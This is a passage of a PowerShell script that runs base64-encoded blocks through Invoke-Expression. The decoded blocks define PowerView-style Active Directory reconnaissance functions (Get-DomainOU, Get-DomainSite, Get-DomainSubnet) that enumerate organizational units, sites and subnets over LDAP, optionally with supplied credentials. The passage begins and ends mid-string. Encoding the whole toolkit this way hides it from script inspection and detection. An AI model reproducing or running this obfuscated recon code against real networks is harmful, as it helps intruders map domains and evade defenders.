FuY2UpIgogICAgICAgICAgICAgICAgICAgIGlmICgoLW5vdCAkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddKSAtYW5kICgtbm90ICRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoQmFzZSddKSkgewogICAgICAgICAgICAgICAgICAgICAgICAkSWRlbnRpdHlEb21haW4gPSAkSWRlbnRpdHlJbnN0YW5jZS5TdWJTdHJpbmcoJElkZW50aXR5SW5zdGFuY2UuSW5kZXhPZignREM9JykpIC1yZXBsYWNlICdEQz0nLCcnIC1yZXBsYWNlICcsJywnLicKICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5PVV0gRXh0cmFjdGVkIGRvbWFpbiAnJElkZW50aXR5RG9tYWluJyBmcm9tICckSWRlbnRpdHlJbnN0YW5jZSciCiAgICAgICAgICAgICAgICAgICAgICAgICRTZWFyY2hlckFyZ3VtZW50c1snRG9tYWluJ10gPSAkSWRlbnRpdHlEb21haW4KICAgICAgICAgICAgICAgICAgICAgICAgJE9VU2VhcmNoZXIgPSBHZXQtRG9tYWluU2VhcmNoZXIgQFNlYXJjaGVyQXJndW1lbnRzCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgtbm90ICRPVVNlYXJjaGVyKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbR2V0LURvbWFpbk9VXSBVbmFibGUgdG8gcmV0cmlldmUgZG9tYWluIHNlYXJjaGVyIGZvciAnJElkZW50aXR5RG9tYWluJyIKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRHdWlkQnl0ZVN0cmluZyA9ICgtSm9pbiAoKFtHdWlkXSRJZGVudGl0eUluc3RhbmNlKS5Ub0J5dGVBcnJheSgpIHwgRm9yRWFjaC1PYmplY3QgeyRfLlRvU3RyaW5nKCdYJykuUGFkTGVmdCgyLCcwJyl9KSkgLVJlcGxhY2UgJyguLiknLCdcJDEnCiAgICAgICAgICAgICAgICAgICAgICAgICRJZGVudGl0eUZpbHRlciArPSAiKG9iamVjdGd1aWQ9JEd1aWRCeXRlU3RyaW5nKSIKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgICAgICAgICAkSWRlbnRpdHlGaWx0ZXIgKz0gIihuYW1lPSRJZGVudGl0eUluc3RhbmNlKSIKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCRJZGVudGl0eUZpbHRlciAtYW5kICgkSWRlbnRpdHlGaWx0ZXIuVHJpbSgpIC1uZSAnJykgKSB7CiAgICAgICAgICAgICAgICAkRmlsdGVyICs9ICIofCRJZGVudGl0eUZpbHRlcikiCiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snR1BMaW5rJ10pIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluT1VdIFNlYXJjaGluZyBmb3IgT1VzIHdpdGggJEdQTGluayBzZXQgaW4gdGhlIGdwTGluayBwcm9wZXJ0eSIKICAgICAgICAgICAgICAgICRGaWx0ZXIgKz0gIihncGxpbms9KiRHUExpbmsqKSIKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydMREFQRmlsdGVyJ10pIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluT1VdIFVzaW5nIGFkZGl0aW9uYWwgTERBUCBmaWx0ZXI6ICRMREFQRmlsdGVyIgogICAgICAgICAgICAgICAgJEZpbHRlciArPSAiJExEQVBGaWx0ZXIiCiAgICAgICAgICAgIH0KICAgICAgICAgICAgJE9VU2VhcmNoZXIuZmlsdGVyID0gIigmKG9iamVjdENhdGVnb3J5PW9yZ2FuaXphdGlvbmFsVW5pdCkkRmlsdGVyKSIKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5PVV0gR2V0LURvbWFpbk9VIGZpbHRlciBzdHJpbmc6ICQoJE9VU2VhcmNoZXIuZmlsdGVyKSIKICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRmluZE9uZSddKSB7ICRSZXN1bHRzID0gJE9VU2VhcmNoZXIuRmluZE9uZSgpIH0KICAgICAgICAgICAgZWxzZSB7ICRSZXN1bHRzID0gJE9VU2VhcmNoZXIuRmluZEFsbCgpIH0KICAgICAgICAgICAgJFJlc3VsdHMgfCBXaGVyZS1PYmplY3QgeyRffSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1JhdyddKSB7CiAgICAgICAgICAgICAgICAgICAgJE9VID0gJF8KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICRPVSA9IENvbnZlcnQtTERBUFByb3BlcnR5IC1Qcm9wZXJ0aWVzICRfLlByb3BlcnRpZXMKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICRPVS5QU09iamVjdC5UeXBlTmFtZXMuSW5zZXJ0KDAsICdQb3dlclZpZXcuT1UnKQogICAgICAgICAgICAgICAgJE9VCiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCRSZXN1bHRzKSB7CiAgICAgICAgICAgICAgICB0cnkgeyAkUmVzdWx0cy5kaXNwb3NlKCkgfQogICAgICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluT1VdIEVycm9yIGRpc3Bvc2luZyBvZiB0aGUgUmVzdWx0cyBvYmplY3Q6ICRfIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgICRPVVNlYXJjaGVyLmRpc3Bvc2UoKQogICAgICAgIH0KICAgIH0KfQo=")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LURvbWFpblNpdGUgewogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuU2l0ZScpXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtICgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ05hbWUnKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJElkZW50aXR5LAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICBbQWxpYXMoJ0dVSUQnKV0KICAgICAgICAkR1BMaW5rLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdGaWx0ZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRMREFQRmlsdGVyLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRQcm9wZXJ0aWVzLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdBRFNQYXRoJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoQmFzZSwKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRG9tYWluQ29udHJvbGxlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlcnZlciwKICAgICAgICBbVmFsaWRhdGVTZXQoJ0Jhc2UnLCAnT25lTGV2ZWwnLCAnU3VidHJlZScpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaFNjb3BlID0gJ1N1YnRyZWUnLAogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRSZXN1bHRQYWdlU2l6ZSA9IDIwMCwKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkU2VydmVyVGltZUxpbWl0LAogICAgICAgIFtWYWxpZGF0ZVNldCgnRGFjbCcsICdHcm91cCcsICdOb25lJywgJ093bmVyJywgJ1NhY2wnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWN1cml0eU1hc2tzLAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFRvbWJzdG9uZSwKICAgICAgICBbQWxpYXMoJ1JldHVybk9uZScpXQogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJEZpbmRPbmUsCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5LAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFJhdwogICAgKQogICAgQkVHSU4gewogICAgICAgICRTZWFyY2hlckFyZ3VtZW50cyA9IEB7CiAgICAgICAgICAgICdTZWFyY2hCYXNlUHJlZml4JyA9ICdDTj1TaXRlcyxDTj1Db25maWd1cmF0aW9uJwogICAgICAgIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEb21haW4nXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJERvbWFpbiB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUHJvcGVydGllcyddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snUHJvcGVydGllcyddID0gJFByb3BlcnRpZXMgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaEJhc2UnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaEJhc2UnXSA9ICRTZWFyY2hCYXNlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXInXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoU2NvcGUnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaFNjb3BlJ10gPSAkU2VhcmNoU2NvcGUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Jlc3VsdFBhZ2VTaXplJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydSZXN1bHRQYWdlU2l6ZSddID0gJFJlc3VsdFBhZ2VTaXplIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXJUaW1lTGltaXQnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlclRpbWVMaW1pdCddID0gJFNlcnZlclRpbWVMaW1pdCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VjdXJpdHlNYXNrcyddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VjdXJpdHlNYXNrcyddID0gJFNlY3VyaXR5TWFza3MgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RvbWJzdG9uZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snVG9tYnN0b25lJ10gPSAkVG9tYnN0b25lIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICAgICAgJFNpdGVTZWFyY2hlciA9IEdldC1Eb21haW5TZWFyY2hlciBAU2VhcmNoZXJBcmd1bWVudHMKICAgIH0KICAgIFBST0NFU1MgewogICAgICAgIGlmICgkU2l0ZVNlYXJjaGVyKSB7CiAgICAgICAgICAgICRJZGVudGl0eUZpbHRlciA9ICcnCiAgICAgICAgICAgICRGaWx0ZXIgPSAnJwogICAgICAgICAgICAkSWRlbnRpdHkgfCBXaGVyZS1PYmplY3QgeyRffSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICRJZGVudGl0eUluc3RhbmNlID0gJF8uUmVwbGFjZSgnKCcsICdcMjgnKS5SZXBsYWNlKCcpJywgJ1wyOScpCiAgICAgICAgICAgICAgICBpZiAoJElkZW50aXR5SW5zdGFuY2UgLW1hdGNoICdeQ049LionKSB7CiAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5RmlsdGVyICs9ICIoZGlzdGluZ3Vpc2hlZG5hbWU9JElkZW50aXR5SW5zdGFuY2UpIgogICAgICAgICAgICAgICAgICAgIGlmICgoLW5vdCAkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddKSAtYW5kICgtbm90ICRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoQmFzZSddKSkgewogICAgICAgICAgICAgICAgICAgICAgICAkSWRlbnRpdHlEb21haW4gPSAkSWRlbnRpdHlJbnN0YW5jZS5TdWJTdHJpbmcoJElkZW50aXR5SW5zdGFuY2UuSW5kZXhPZignREM9JykpIC1yZXBsYWNlICdEQz0nLCcnIC1yZXBsYWNlICcsJywnLicKICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5TaXRlXSBFeHRyYWN0ZWQgZG9tYWluICckSWRlbnRpdHlEb21haW4nIGZyb20gJyRJZGVudGl0eUluc3RhbmNlJyIKICAgICAgICAgICAgICAgICAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzWydEb21haW4nXSA9ICRJZGVudGl0eURvbWFpbgogICAgICAgICAgICAgICAgICAgICAgICAkU2l0ZVNlYXJjaGVyID0gR2V0LURvbWFpblNlYXJjaGVyIEBTZWFyY2hlckFyZ3VtZW50cwogICAgICAgICAgICAgICAgICAgICAgICBpZiAoLW5vdCAkU2l0ZVNlYXJjaGVyKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbR2V0LURvbWFpblNpdGVdIFVuYWJsZSB0byByZXRyaWV2ZSBkb21haW4gc2VhcmNoZXIgZm9yICckSWRlbnRpdHlEb21haW4nIgogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAgICAgJEd1aWRCeXRlU3RyaW5nID0gKC1Kb2luICgoW0d1aWRdJElkZW50aXR5SW5zdGFuY2UpLlRvQnl0ZUFycmF5KCkgfCBGb3JFYWNoLU9iamVjdCB7JF8uVG9TdHJpbmcoJ1gnKS5QYWRMZWZ0KDIsJzAnKX0pKSAtUmVwbGFjZSAnKC4uKScsJ1wkMScKICAgICAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5RmlsdGVyICs9ICIob2JqZWN0Z3VpZD0kR3VpZEJ5dGVTdHJpbmcpIgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgICAgICRJZGVudGl0eUZpbHRlciArPSAiKG5hbWU9JElkZW50aXR5SW5zdGFuY2UpIgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoJElkZW50aXR5RmlsdGVyIC1hbmQgKCRJZGVudGl0eUZpbHRlci5UcmltKCkgLW5lICcnKSApIHsKICAgICAgICAgICAgICAgICRGaWx0ZXIgKz0gIih8JElkZW50aXR5RmlsdGVyKSIKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydHUExpbmsnXSkgewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5TaXRlXSBTZWFyY2hpbmcgZm9yIHNpdGVzIHdpdGggJEdQTGluayBzZXQgaW4gdGhlIGdwTGluayBwcm9wZXJ0eSIKICAgICAgICAgICAgICAgICRGaWx0ZXIgKz0gIihncGxpbms9KiRHUExpbmsqKSIKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydMREFQRmlsdGVyJ10pIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluU2l0ZV0gVXNpbmcgYWRkaXRpb25hbCBMREFQIGZpbHRlcjogJExEQVBGaWx0ZXIiCiAgICAgICAgICAgICAgICAkRmlsdGVyICs9ICIkTERBUEZpbHRlciIKICAgICAgICAgICAgfQogICAgICAgICAgICAkU2l0ZVNlYXJjaGVyLmZpbHRlciA9ICIoJihvYmplY3RDYXRlZ29yeT1zaXRlKSRGaWx0ZXIpIgogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpblNpdGVdIEdldC1Eb21haW5TaXRlIGZpbHRlciBzdHJpbmc6ICQoJFNpdGVTZWFyY2hlci5maWx0ZXIpIgogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydGaW5kT25lJ10pIHsgJFJlc3VsdHMgPSAkU2l0ZVNlYXJjaGVyLkZpbmRBbGwoKSB9CiAgICAgICAgICAgIGVsc2UgeyAkUmVzdWx0cyA9ICRTaXRlU2VhcmNoZXIuRmluZEFsbCgpIH0KICAgICAgICAgICAgJFJlc3VsdHMgfCBXaGVyZS1PYmplY3QgeyRffSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1JhdyddKSB7CiAgICAgICAgICAgICAgICAgICAgJFNpdGUgPSAkXwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgJFNpdGUgPSBDb252ZXJ0LUxEQVBQcm9wZXJ0eSAtUHJvcGVydGllcyAkXy5Qcm9wZXJ0aWVzCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkU2l0ZS5QU09iamVjdC5UeXBlTmFtZXMuSW5zZXJ0KDAsICdQb3dlclZpZXcuU2l0ZScpCiAgICAgICAgICAgICAgICAkU2l0ZQogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICgkUmVzdWx0cykgewogICAgICAgICAgICAgICAgdHJ5IHsgJFJlc3VsdHMuZGlzcG9zZSgpIH0KICAgICAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpblNpdGVdIEVycm9yIGRpc3Bvc2luZyBvZiB0aGUgUmVzdWx0cyBvYmplY3QiCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJFNpdGVTZWFyY2hlci5kaXNwb3NlKCkKICAgICAgICB9CiAgICB9Cn0K")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LURvbWFpblN1Ym5ldCB7CiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNTaG91bGRQcm9jZXNzJywgJycpXQogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5TdWJuZXQnKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSAoCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdOYW1lJyldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRJZGVudGl0eSwKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNpdGVOYW1lLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdGaWx0ZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRMREFQRmlsdGVyLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRQcm9wZXJ0aWVzLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdBRFNQYXRoJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoQmFzZSwKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRG9tYWluQ29udHJvbGxlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlcnZlciwKICAgICAgICBbVmFsaWRhdGVTZXQoJ0Jhc2UnLCAnT25lTGV2ZWwnLCAnU3VidHJlZScpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaFNjb3BlID0gJ1N1YnRyZWUnLAogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRSZXN1bHRQYWdlU2l6ZSA9IDIwMCwKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkU2VydmVyVGltZUxpbWl0LAogICAgICAgIFtWYWxpZGF0ZVNldCgnRGFjbCcsICdHcm91cCcsICdOb25lJywgJ093bmVyJywgJ1NhY2wnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWN1cml0eU1hc2tzLAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFRvbWJzdG9uZSwKICAgICAgICBbQWxpYXMoJ1JldHVybk9uZScpXQogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJEZpbmRPbmUsCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5LAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFJhdwogICAgKQogICAgQkVHSU4gewogICAgICAgICRTZWFyY2hlckFyZ3VtZW50cyA9IEB7CiAgICAgICAgICAgICdTZWFyY2hCYXNlUHJlZml4JyA9ICdDTj1TdWJuZXRzLENOPVNpdGVzLENOPUNvbmZpZ3VyYXRpb24nCiAgICAgICAgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snRG9tYWluJ10gPSAkRG9tYWluIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydQcm9wZXJ0aWVzJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydQcm9wZXJ0aWVzJ10gPSAkUHJvcGVydGllcyB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoQmFzZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoQmFzZSddID0gJFNlYXJjaEJhc2UgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlciddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyJ10gPSAkU2VydmVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hTY29wZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoU2NvcGUnXSA9ICRTZWFyY2hTY29wZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmVzdWx0UGFnZVNpemUnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1Jlc3VsdFBhZ2VTaXplJ10gPSAkUmVzdWx0UGFnZVNpemUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlclRpbWVMaW1pdCddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyVGltZUxpbWl0J10gPSAkU2VydmVyVGltZUxpbWl0IH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWN1cml0eU1hc2tzJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZWN1cml0eU1hc2tzJ10gPSAkU2VjdXJpdHlNYXNrcyB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVG9tYnN0b25lJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydUb21ic3RvbmUnXSA9ICRUb21ic3RvbmUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KICAgICAgICAkU3VibmV0U2VhcmNoZXIgPSBHZXQtRG9tYWluU2VhcmNoZXIgQFNlYXJjaGVyQXJndW1lbnRzCiAgICB9CiAgICBQUk9DRVNTIHsKICAgICAgICBpZiAoJFN1Ym5ldFNlYXJjaGVyKSB7CiAgICAgICAgICAgICRJZGVudGl0eUZpbHRlciA9ICcnCiAgICAgICAgICAgICRGaWx0ZXIgPSAnJwogICAgICAgICAgICAkSWRlbnRpdHkgfCBXaGVyZS1PYmplY3QgeyRffSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICRJZGVudGl0eUluc3RhbmNlID0gJF8uUmVwbGFjZSgnKCcsICdcMjgnKS5SZXBsYWNlKCcpJywgJ1wyOScpCiAgICAgICAgICAgICAgICBpZiAoJElkZW50aXR5SW5zdGFuY2UgLW1hdGNoICdeQ049LionKSB7CiAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5RmlsdGVyICs9ICIoZGlzdGluZ3Vpc2hlZG5hbWU9JElkZW50aXR5SW5zdGFuY2UpIgogICAgICAgICAgICAgICAgICAgIGlmICgoLW5vdCAkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddKSAtYW5kICgtbm90ICRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoQmFzZSddKSkgewogICAgICAgICAgICAgICAgICAgICAgICAkSWRlbnRpdHlEb21haW4gPSAkSWRlbnRpdHlJbnN0YW5jZS5TdWJTdHJpbmcoJElkZW50aXR5SW5zdGFuY2UuSW5kZXhPZignREM9JykpIC1yZXBsYWNlICdEQz0nLCcnIC1yZXBsYWNlICcsJywnLicKICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5TdWJuZXRdIEV4dHJhY3RlZCBkb21haW4gJyRJZGVudGl0eURvbWFpbicgZnJvbSAnJElkZW50aXR5SW5zdGFuY2UnIgogICAgICAgICAgICAgICAgICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJElkZW50aXR5RG9tYWluCiAgICAgICAgICAgICAgICAgICAgICAgICRTdWJuZXRTZWFyY2hlciA9IEdldC1Eb21haW5TZWFyY2hlciBAU2VhcmNoZXJBcmd1bWVudHMKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKC1ub3QgJFN1Ym5ldFNlYXJjaGVyKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbR2V0LURvbWFpblN1Ym5ldF0gVW5hYmxlIHRvIHJldHJpZXZlIGRvbWFpbiBzZWFyY2hlciBmb3IgJyRJZGVudGl0eURvbWFpbiciCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgI